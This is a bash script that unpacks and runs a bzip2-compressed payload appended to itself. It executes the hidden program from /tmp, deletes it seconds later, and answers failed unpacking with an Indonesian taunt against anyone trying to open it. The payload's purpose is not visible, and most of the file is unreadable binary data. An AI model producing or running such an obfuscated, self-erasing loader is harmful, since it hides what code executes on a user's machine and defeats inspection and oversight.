#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��_ U�p� }�����������`�    h    1�2a 1�4h��h   Ҡ hi� P      �ѣh�&b��F� i��  1�2a 1�4h��h  �ѣh�&b��F� i��  R"b24�ѐ��i�hѣQ�'��`MM�z�U3G��DMg��c~)>G��P�X�(R���H�Ȯ��4�R�cWR"#�""-"#�WP�$�̡��S�$���R�2"���{趏�����.$���~ٖW��l�.ak�����Q4l�j�\���q1~ښ�י��>�K��$��o$�"���H�+&r��Du�#���$�#����I�׎�4����II����࡜ݶ9	����!�(!�0��B<��g�P�f���r�݁���8�F���?%�^a$��k�J�-&w<I�S;G��ߛ�Y��Щh����u�W���n�M㕨Ǝ�#������]z�cJ�ʶ��cJ�9"jT06��(��LE��F��򮈪���I�i�cȷF��aދqOr�q0$�g7ifP����7���v��o�n:����۶���̦�w�-���1��&f�l�a�C�=O�[}���N7����д�P�.0#4H�"=��>Ȫ�h���c���~������w;_��CO-ΤM�JQL$D��m�#��xYDY��b��d*�;/������j�^���U�\i�N:Ǳ�Z�b�a����GzsE>~�si�t�;#װՉ�pK���1GDlG�ʵ��e�̫���S������iT��ǁH�x���`s��_ʷB�c�P�d5(��R�K�fB�z��Qv�0r.ms�ħ�j5W�z����~-)�h·�)��){��d~_(�1QYģv��m��	iL��tL�˻��#�db���WusY�lL��H�_���Q��EԺ���qq��5U#&l�6գsȊ����7�J��&
t�/7����o?�;ʡm���9m�Ǧ0��|���v��Z����W3�d�1)�v�b��.�}V�Ic����xiZ���e/@�k�/,��S�0Pshb�BiP��<5�(�,D� &X�N<\���,��܍N��P�B�k;=�h�s4�.^����%�3ڛj3��������u�+lQɿ�J&�sJ�D=(��$��Z�J�yބ[�-J�e�vҚ��9Έ���5m�5QJKqt�������K�����"����?%��5�3�/0�K���������W��l����+3��Z��,|��3Nq�M�j]+�c��dT�����	��q��%�i�C>����H�eD��R�k��.t��`��^8��ݥ���Y�^-�y�cP���.�$�C���h��-��"I7\h�lCk��/
�`�s�
Oe���D�Ib7��m��st^x��3���6���5����%�73L��2�ƍ��R�ǁ��P�2C�C$sBn��ʙaã�.�b�];�E����V*%��Í����-�w��&�Xa��׿W�fǾQ��}��+c(��|��i�eX���z�f�e+ ���J�ӷ�޵x]c�,�UC��\nE-��,Z�x��k�+\k�8�5�==:c�o.�-�{yGJ��tX4)}h�֋�+���W����/q27Ű�n�]����%:�l�Mv�"�؄�<[�WA�l�˶%5�א����Do�Lb!Q4�nDTߌ�}�Qa�ZDH8EH�C�5���B��[:�#���ᓑ�"��aS���)����H�9̊�Em�C����<(�Rq�w��R�&����e�R�J����Z�Q�߿e[+��$�g..5RfU��-�����o*�0.�1���������M�M(�GDx���IZ��(q�1i3S�^t�*40��<sF&e�`u�*P�up�%�6�Z��V��M�q�5-�\��[Pu�G�lEQ����W]�C\��}�7v\$��n�=�7ψ݅�Z����./vV��8#]���C(�0	;���A��n[�{����H�
u�� 